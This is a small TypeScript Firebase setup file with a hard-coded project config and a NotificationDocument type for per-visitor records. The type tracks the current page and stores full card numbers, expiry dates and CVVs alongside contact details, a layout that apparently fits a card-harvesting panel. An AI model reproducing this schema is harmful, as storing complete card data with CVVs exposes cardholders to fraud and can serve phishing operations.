import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore} from 'firebase/firestore';
import { getDatabase} from 'firebase/database';

const firebaseConfig = {
  apiKey: "AIzaSyAznkN7UaHw2tJOMgcFbhXz_peJgxDcwvA",
  authDomain: "daswq-710f1.firebaseapp.com",
  projectId: "daswq-710f1",
  storageBucket: "daswq-710f1.firebasestorage.app",
  messagingSenderId: "390148483841",
  appId: "1:390148483841:web:6dc053e7b96385932b4900",
  measurementId: "G-7WKJS2H96Q"
};


const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);


export { app, auth, db ,database};

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}

